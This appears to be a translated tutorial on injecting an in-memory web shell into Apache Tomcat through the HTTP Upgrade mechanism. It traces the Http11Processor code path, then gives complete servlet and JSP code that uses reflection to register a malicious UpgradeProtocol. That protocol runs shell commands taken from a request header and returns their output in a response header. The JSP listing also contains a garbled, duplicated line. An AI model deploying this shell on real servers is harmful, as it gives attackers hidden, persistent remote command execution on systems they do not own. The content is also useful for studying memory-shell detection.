# Java Security Of Tomcat Upgrade

## Preparation

​ The middleware memory horse Upgrade is still based on the memory horse injection of the Connector. In the middleware memory horse Executor, the Executor component in the `Endpoint` in the `ProtocolHandler` is used, and the Upgrade` uses another component of the `ProtocolHandler`, that is, the `Upgrade` component in the `Processor`.

![](img/1.png)

## Process Analysis

​ `Processor` is an interface that targets different protocols and has different specific implementation classes. Since it uses the `HTTP` protocol, let's take a look at `org.apache.coyote.http11.Http11Processor`.

![](img/2.png)

​ `Http11Processor` will perform the following steps when processing `Upgrade`:

- The `Http11Processor#service` method will check whether the value of the `Connection` field in the request header contains `upgrade`;
- If the value of the `Connection` field in the request header contains `upgrade`, the `request#getHeader` method will be called to obtain the `Upgrade` request header, and select the corresponding `Upgrade` object based on the obtained result;
- When `upgradeProtocol` is not empty, call the `accept` method of the object.

Therefore, you can try to insert malicious code into the `accept` method to achieve the purpose of command execution.

![](img/3.png)

Next, let’s take a look at how `httpUpgradeProtocols` is obtained. In the initialization stage of `Http11Processor`, `httpUpgradeProtocols` will be assigned.

![](img/4.png)

​An `Http11Protocol#createProcessor` object will be instantiated in the `org.apache.coyote.http11.AbstractHttp11Protocol#createProcessor` method and pass in `httpUpgradeProtocols`.

![](img/5.png)

​ Continue to follow up and see where `httpUpgradeProtocols` is assigned in `org.apache.coyote.http11.AbstractHttp11Protocol` is assigned, and follow up on `org.apache.coyote.http11.AbstractHttp11Protocol#configureUpgradeProtocol` method. Here you add `httpUpgradeName` and `upgradeProtocol` to the `HashMap` of `httpUpgradeProtocols`.

![](img/6.png)

Therefore, by adding an item to `httpUpgradeProtocols` through reflection call, you can implement the `Upgrade` memory horse. By setting the breakpoint, find a `httpUpgradeProtocols`, and implement the path `request`->`request`->`connector`->`protocolHandler`->`httpUpgradeProtocols`.

![](img/7.png)

## Achievement

### Idea

​ The specific ideas for dynamically registering the `Upgrade` memory horse are as follows:

- Get the `httpUpgradeProtocols` property;
- Create a malicious `upgradeProtocol`;
- Insert the malicious `upgradeProtocol` into `httpUpgradeProtocols`.

### Dynamic Registration

#### Servlet

```java
package servlet;

import org.apache.catalina.connector.Connector;
import org.apache.coyote.*;
import org.apache.coyote.http11.Http11NioProtocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Scanner;

@WebServlet(name = "UpgradeMemoryShellServlet", value = "/UpgradeMemoryShellServlet")
public class UpgradeMemoryShellServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            Object request1 = getField(request, "request");
            Connector connector = (Connector) getField(request1, "connector");
            Http11NioProtocol protocolHandler = (Http11NioProtocol) getField(connector, "protocolHandler");
            HashMap httpUpgradeProtocols = (HashMap) getField(protocolHandler, "httpUpgradeProtocols");
            httpUpgradeProtocols.put("H3rmesk1t", new EvilUpgrade());
            response.getWriter().println("Upgrade Inject Successfully...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    class EvilUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean isSecure) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
            return null;
        }

        @Override
        public
boolean accept(Request request) {
            String cmd = request.getHeader("set-reference");
            try {
                if (cmd != null) {
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }

                    String[] commands = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(commands).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                    String output = scanner.hasNext() ? scanner.next() : "";

                    Response response = (Response) getField(request, "response");
                    response.addHeader("set-message", new String(output.getBytes(), StandardCharsets.UTF_8));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
    }

    public Object getField(Object obj, String field) {
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }
}
```

![](img/8.png)

### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.http11.Http11NioProtocol" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="org.apache.coyote.*" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
  class EvilUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean isSecure) {
      return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
      return new byte[0];
    }

    @Override
    public String getAlpnName() {
      return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
      return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
      return null;
    }

    @Override
    public boolean accept(Request request) {
      String cmd = request.getHeader("set-reference");
      try {
        if (cmd != null) {
          boolean isLinux = true;
          String osType = System.getProperty("os.name");
          if (osType != null && osType.toLowerCase().contains("win")) {
            isLinux = false;
          }

          String[] commands = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
          InputStream inputStream = Runtime.getRuntime().exec(commands).getInputStream();
          Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
          String output = scanner.hasNext() ? scanner.next() : "";

          Response response = (Response) getField(request, "response");
          response.addHeader("set-message", new String(output.getBytes(), StandardCharsets.UTF_8));
        }
      } catch (Exception e) {
        e.printStackTrace();
      }
      return false;
    }
  }

  public Object getField(Object obj, String field) {
    Class clazz = obj.getClass();
    while (clazz != Object.class) {
      try {
        Field declaredField = clazz.getDeclaredField(field);
        declaredFie declaredFie
ld.setAccessible(true);
        return declaredField.get(obj);
      } catch (Exception e) {
        clazz = clazz.getSuperclass();
      }
    }
    return null;
  }
%>

<%
  Object request1 = getField(request, "request");
  Connector connector = (Connector) getField(request1, "connector");
  Http11NioProtocol protocolHandler = (Http11NioProtocol) getField(connector, "protocolHandler");
  HashMap httpUpgradeProtocols = (HashMap) getField(protocolHandler, "httpUpgradeProtocols");
  httpUpgradeProtocols.put("H3rmesk1t", new EvilUpgrade());
  response.getWriter().println("Upgrade Inject Successfully...");
%>
```

![](img/9.png)